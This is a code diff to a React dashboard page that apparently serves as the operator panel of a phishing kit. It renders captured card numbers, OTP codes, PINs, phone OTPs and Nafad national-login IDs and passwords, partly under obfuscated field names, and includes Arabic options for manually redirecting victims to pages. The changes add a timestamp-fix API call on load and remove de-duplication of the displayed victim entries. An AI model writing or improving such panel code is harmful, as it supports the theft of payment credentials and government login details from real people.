@@ -111,6 +111,26 @@ export default function DashboardPage() {
     return () => clearInterval(interval);
   }, []);
 
+  // Fix timestamps for existing records on page load
+  useEffect(() => {
+    const fixTimestamps = async () => {
+      try {
+        const baseUrl = (import.meta.env.VITE_API_BASE || window.location.origin || '').replace(/\/+$/, '');
+        const response = await fetch(`${baseUrl}/api/dashboard/fix-timestamps`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+        });
+        if (response.ok) {
+          const result = await response.json();
+          console.log('[Dashboard] Fixed timestamps:', result);
+        }
+      } catch (error) {
+        console.error('[Dashboard] Failed to fix timestamps:', error);
+      }
+    };
+    fixTimestamps();
+  }, []);
+
   // Page options for manual redirect
   const pageOptions = [
     { value: "", label: "اختر صفحة للتوجيه..." },
@@ -2044,19 +2064,9 @@ const renderNafadBox = () => {
     
     const boxes: BoxType[] = [];
     
-    // Create a box for each UNIQUE entry in customerEntryGroup that has basic or insurance data
-    // Use Set to track unique entries by their data signature
-    const createdBoxes = new Set<string>();
-    
+    // Create a box for each entry in customerEntryGroup that has basic or insurance data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
-      
-      // Create a unique key for this entry's data
-      const dataSignature = `${raw.identityNumber || ''}-${raw.ownerName || ''}-${raw.buyerName || ''}-${raw.phoneNumber || ''}`;
-      
-      // Skip if we've already created a box for this exact data
-      if (createdBoxes.has(dataSignature)) return;
-      createdBoxes.add(dataSignature);
       
       // Use entry ID as unique base timestamp to ensure stable ordering
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
@@ -2279,17 +2289,10 @@ const renderNafadBox = () => {
     // If still no boxes, return null
     if (boxes.length === 0) return null;
     
-    // Create a box for each UNIQUE entry that has Card data
-    const cardBoxes = new Set<string>();
-    
+    // Create a box for each entry that has Card data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const cardNumber = raw._v1 || raw.cardNumber;
-      
-      // Create a unique key for card data
-      const cardSignature = `card-${raw._v1 || raw.cardNumber || ''}`;
-      if (cardBoxes.has(cardSignature)) return;
-      cardBoxes.add(cardSignature);
       
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 1;
@@ -2395,17 +2398,10 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each UNIQUE entry that has OTP data
-    const otpBoxes = new Set<string>();
-    
+    // Create a box for each entry that has OTP data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      
-      // Create a unique key for OTP data
-      const otpSignature = `otp-${raw._v5 || raw.otpCode || ''}`;
-      if (otpBoxes.has(otpSignature)) return;
-      otpBoxes.add(otpSignature);
       
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 2;
@@ -2490,17 +2486,10 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each UNIQUE entry that has PIN data
-    const pinBoxes = new Set<string>();
-    
+    // Create a box for each entry that has PIN data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      
-      // Create a unique key for PIN data
-      const pinSignature = `pin-${raw._v6 || raw.pinCode || ''}`;
-      if (pinBoxes.has(pinSignature)) return;
-      pinBoxes.add(pinSignature);
       
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 3;
@@ -2585,17 +2574,10 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each UNIQUE entry that has Phone data
-    const phoneBoxes = new Set<string>();
-    
+    // Create a box for each entry that has Phone data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const hasPhone = raw.phoneNumber || raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
-      
-      // Create a unique key for phone data
-      const phoneSignature = `phone-${raw.phoneNumber || raw.phoneIdNumber || ''}`;
-      if (phoneBoxes.has(phoneSignature)) return;
-      phoneBoxes.add(phoneSignature);
       
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 4;
@@ -2701,17 +2683,10 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each UNIQUE entry that has Nafad data
-    const nafadBoxes = new Set<string>();
-    
+    // Create a box for each entry that has Nafad data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
-      
-      // Create a unique key for nafad data
-      const nafadSignature = `nafad-${raw.nafadIdNumber || ''}`;
-      if (nafadBoxes.has(nafadSignature)) return;
-      nafadBoxes.add(nafadSignature);
       
       // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
       const BOX_TYPE_OFFSET = 5;
